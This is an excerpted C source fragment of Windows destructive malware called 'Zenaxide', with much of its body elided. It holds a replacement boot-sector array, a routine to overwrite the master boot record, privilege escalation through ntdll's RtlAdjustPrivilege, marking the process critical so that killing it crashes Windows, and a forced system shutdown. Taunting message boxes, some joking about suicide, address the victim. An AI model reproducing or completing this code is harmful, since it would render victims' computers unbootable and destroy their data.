...
const CHAR pccMbrData[512] = {
	...
	,
...
start:
	...
	else
	{
		*wcsrchr(szPath, L'.') = 0;
		...
		if (MessageBoxW(NULL, L"Are you suuuure ya wanna run Zenaxide?\nThis is your only and final chance.", L"Zenaxide.exe", MB_ICONWARNING | MB_YESNO | MB_TOPMOST | MB_DEFBUTTON2) != IDYES)
			return FALSE;
	}
...
OverwriteBoot(VOID)
{
	...
	{
		MessageBoxW(NULL, L"I failed to infect your computer and I am a burden.\n...\nI hope you don't mind.\n(God, I am so anxious of what I did...)", L"Zenaxide.exe", MB_OK | MB_ICONERROR);
		return FALSE;
	}
	...
	if (!bSuccess)
	{
		MessageBoxW(NULL, L"Uhm... Why can't I overwrite your bootloader?\nOkay, well, I guess I can hang myself now.", L"Zenaxide.exe", MB_OK | MB_ICONERROR);
		CloseHandle(hDrive);
		return FALSE;
	}
...
typedef NTSTATUS(NTAPI* RtlAdjustPrivilegeFunc)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
typedef NTSTATUS(NTAPI* NtShutdownSystemFunc)(_In_ SHUTDOWN_ACTION Action);

typedef NTSTATUS(NTAPI* NtSetSystemPowerStateFunc)(_In_ POWER_ACTION SystemAction, _In_ SYSTEM_POWER_STATE MinSystemState, _In_ ULONG Flags);
typedef NTSTATUS(NTAPI* RtlSetProcessIsCriticalFunc) (IN BOOLEAN NewValue, OUT PBOOLEAN OldValue, IN BOOLEAN     IsWinlogon);
...
ForceShutdownComputer(VOID)
{
	...
	NtShutdownSystemFunc NtShutdownSystem;
	NtSetSystemPowerStateFunc NtSetSystemPowerState;
	...
	RtlAdjustPrivilege = (RtlAdjustPrivilegeFunc)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	NtSetSystemPowerState = (NtSetSystemPowerStateFunc)GetProcAddress(hNtDll, "NtSetSystemPowerState");
	NtShutdownSystem = (NtShutdownSystemFunc)GetProcAddress(hNtDll, "NtShutdownSystem");
	...
	if (!bSuccess)
	{
		MessageBoxW(NULL, L"I can't power off the computer.\nYou're lucky this time...", L"Zenaxide.exe", MB_OK | MB_ICONERROR);
		return FALSE;
	}
...
{
	RtlAdjustPrivilegeFunc RtlAdjustPrivilege;
	RtlSetProcessIsCriticalFunc RtlSetProcessIsCritical;
	NTSTATUS ntReturnValue;
	...
	hNtDll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (RtlAdjustPrivilegeFunc)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (RtlSetProcessIsCriticalFunc)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");
	...
	if (RtlAdjustPrivilege)
	{
		...
		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"I can't adjust my debug privileges... somehow.", L"Zenaxide.exe", MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}
	else
	{
		MessageBoxW(NULL, L"Nope, can't find RtlAdjustPrivilege... What the hell is this?", L"Zenaxide.exe", MB_OK | MB_ICONERROR);
		return FALSE;
	}
	...
	if (RtlSetProcessIsCritical)
	{
		...
		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"Nice cheats kid. I know what you are doing.", L"Zenaxide.exe", MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}
	else
	{
		MessageBoxW(NULL, L"Spare change? Spare change ma'am?\nI can't find RtlSetProcessIsCritical. Do you know where it is?", L"Zenaxide.exe", MB_OK | MB_ICONERROR);
		return FALSE;
	}
